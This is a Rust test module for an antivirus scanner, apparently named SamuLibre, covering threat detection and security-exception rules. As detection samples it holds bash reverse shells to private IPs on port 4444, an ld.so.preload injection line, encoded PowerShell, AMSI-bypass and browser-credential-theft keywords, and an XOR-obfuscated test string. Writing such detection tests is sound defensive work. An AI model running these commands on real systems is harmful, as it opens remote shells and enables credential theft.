        assert!(!has_suspicious_indicators(
            b"Clean corporate document text without any malware."
        ));
        assert!(!has_suspicious_indicators(
            b"Just an everyday image or data chunk."
        ));
        assert!(has_suspicious_indicators(b"powershell.exe -enc aGVsbG8="));
        assert!(has_suspicious_indicators(
            b"AmsiUtils amsiInitFailed bypass"
        ));
        const OBF_E: &[u8] = &[
            2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10, 4, 115,
            109, 25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30,
            119, 27, 20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119, 28, 19, 22, 31, 123,
            126, 18, 113, 18, 112,
        ];
        let e_dec: Vec<u8> = OBF_E.iter().map(|b| b ^ 0x5A).collect();
        assert!(has_suspicious_indicators(&e_dec));
        assert!(has_suspicious_indicators(b"CryptUnprotectData Login Data"));
        assert!(has_suspicious_indicators(
            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ));
        assert!(has_suspicious_indicators(
            b"echo '/lib/evil.so' >> /etc/ld.so.preload"
        ));
    }

    #[test]
    fn test_linux_threat_detection() {
        let scanner = MultiEngineScanner::new();
        let payload = b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n";
        let res = scanner.scan_bytes(payload, "revshell.sh");
        assert_eq!(res.status, FileScanStatus::Infected);
        assert!(res.detection_name.unwrap().contains("ReverseShell"));
    }

    #[test]
    fn test_pdf_clean_high_entropy_not_flagged() {
        let scanner = MultiEngineScanner::new();
        let mut pdf_data = b"%PDF-1.7\n".to_vec();
        let mut pseudo_rand = vec![0u8; 10000];
        for (i, b) in pseudo_rand.iter_mut().enumerate() {
            *b = ((i * 101 + 37) % 256) as u8;
        }
        pdf_data.extend_from_slice(&pseudo_rand);

        let res = scanner.scan_bytes(&pdf_data, "document.pdf");
        assert_eq!(res.status, FileScanStatus::Clean);
    }

    #[test]
    fn test_pdf_with_active_script_detected() {
        let scanner = MultiEngineScanner::new();
        let mut pdf_data =
            b"%PDF-1.7\n/Type /Action /S /JavaScript /JS (app.alert('pwned'))\n".to_vec();
        let mut pseudo_rand = vec![0u8; 5000];
        for (i, b) in pseudo_rand.iter_mut().enumerate() {
            *b = ((i * 101 + 37) % 256) as u8;
        }
        pdf_data.extend_from_slice(&pseudo_rand);

        let res = scanner.scan_bytes(&pdf_data, "invoice.pdf");
        assert_eq!(res.status, FileScanStatus::Infected);
        assert!(res
            .detection_name
            .unwrap()
            .contains("Exploit.PDF.ActiveScriptOrLaunchTrigger"));
    }

    #[test]
    fn test_hash_pinned_exclusion_lifecycle() {
        let mut scanner = MultiEngineScanner::new();
        let temp_dir = std::env::temp_dir().join(format!("samu_excl_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&temp_dir);

        let test_file = temp_dir.join("admin_tool.dat");
        let suspicious_content = b"SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION; legitimate admin utility payload content";
        fs::write(&test_file, suspicious_content).unwrap();

        // 1. Escaneo antes de exclusión: debe ser detectado como infectado por la regla interna
        let res_before = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_before.status, FileScanStatus::Infected);
        assert!(res_before
            .detection_name
            .unwrap()
            .contains("ExclusionValidation"));

        // 2. Añadir exclusión anclada criptográficamente (Hash Pinned)
        let pinned =
            scanner.add_pinned_exclusion(&test_file, "Herramienta legítima de administración IT");
        assert!(pinned.sha256.is_some());

        // 3. Escaneo tras exclusión válida: debe considerarse limpio por exclusión
        let res_after = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_after.status, FileScanStatus::Clean);
        assert!(res_after.detection_name.unwrap().contains("HashPinned"));

        // 4. Manipulación del archivo: un atacante altera el archivo o inyecta otro payload
        let modified_content = b"SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION; modified payload altered by attacker";
        fs::write(&test_file, modified_content).unwrap();

        // 5. El escáner debe revocar la exclusión porque el hash SHA-256 no coincide, y marcar la infección
        let res_modified = scanner.scan_file(&test_file).unwrap();
        assert_eq!(
            res_modified.status,
            FileScanStatus::Infected,
            "Exclusión no debe aplicar si el archivo fue alterado"
        );

        let _ = fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_security_exception_validation_rules() {
        let mut scanner = MultiEngineScanner::new();

        // 1. Path traversal bloqueado
        let ex_traversal = samulibre_types::SecurityException {
            id: "test1".to_string(),
            name: "Traversal".to_string(),
            target: "C:\\Windows\\..\\System32".to_string(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: None,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::High,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_traversal).is_err());

        // 2. Unidad de disco completa C:\ bloqueada
        let ex_root = samulibre_types::SecurityException {
            id: "test2".to_string(),
            name: "Root".to_string(),
            target: "C:\\".to_string(),
            exception_type: samulibre_types::ExceptionType::Folder {
                include_subdirectories: true,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Critical,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_root).is_err());

        // 3. Componentes internos de SamuLibre bloqueados
        let ex_internal = samulibre_types::SecurityException {
            id: "test3".to_string(),
            name: "Internal".to_string(),
            target: "C:\\Users\\app\\Antivitus-SamuLibre\\data\\signatures".to_string(),
            exception_type: samulibre_types::ExceptionType::Folder {
                include_subdirectories: true,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Critical,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_internal).is_err());

        // 4. Extensión ejecutable de alto riesgo (.exe) bloqueada
        let ex_exe = samulibre_types::SecurityException {
            id: "test4".to_string(),
            name: "Extension Exe".to_string(),
            target: ".exe".to_string(),
            exception_type: samulibre_types::ExceptionType::Extension {
                ext: "exe".to_string(),
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Critical,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_exe).is_err());

        // 5. Extensión no ejecutable permitida (.log)
        let ex_log = samulibre_types::SecurityException {
            id: "test5".to_string(),
            name: "Extension Log".to_string(),
            target: ".log".to_string(),
            exception_type: samulibre_types::ExceptionType::Extension {
                ext: "log".to_string(),
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::SoftwareDevelopment,
            justification: "Logs de desarrollo".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_log).is_ok());
    }

    #[test]
    fn test_security_exception_expiration_and_toggle() {
        let mut scanner = MultiEngineScanner::new();
        let temp_dir =
            std::env::temp_dir().join(format!("samu_excl_exp_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&temp_dir);

        let test_file = temp_dir.join("temp_tool.dat");
        let payload = b"SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION; temp admin task";
        fs::write(&test_file, payload).unwrap();

        // Crear excepción que expiró en el pasado (hace 10 minutos)
        let past_time = (chrono::Utc::now() - chrono::Duration::minutes(10)).to_rfc3339();
        let ex_expired = samulibre_types::SecurityException {
            id: "exp_test_id".to_string(),
            name: "Expired Exception".to_string(),
            target: test_file.to_string_lossy().to_string(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: None,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::AdministrativeTool,
            justification: "Mantenimiento temporal finalizado".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: "hace 1 hora".to_string(),
            expires_at: Some(past_time),
            is_active: true,
            audit_history: Vec::new(),
        };
        scanner.add_security_exception(ex_expired).unwrap();

        // Al escanear, la excepción vencida NO debe aplicar y la amenaza debe ser detectada
        let res = scanner.scan_file(&test_file).unwrap();
        assert_eq!(
            res.status,
            FileScanStatus::Infected,
            "Excepción vencida no debe excluir la amenaza"
        );

        // Crear excepción permanente activa
        let ex_active = samulibre_types::SecurityException {
            id: "active_test_id".to_string(),
            name: "Active Exception".to_string(),
            target: test_file.to_string_lossy().to_string(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: None,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::InvestigatedFalsePositive,
            justification: "Falso positivo verificado".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        scanner.add_security_exception(ex_active).unwrap();

        // Ahora debe estar limpia
        let res_clean = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_clean.status, FileScanStatus::Clean);

        // Desactivar temporalmente la excepción
        let toggled = scanner.toggle_security_exception("active_test_id");
        assert_eq!(toggled, Some(false));

        // Debe volver a detectarse como infectada mientras esté desactivada
        let res_deactivated = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_deactivated.status, FileScanStatus::Infected);

        let _ = fs::remove_dir_all(&temp_dir);
    }
}
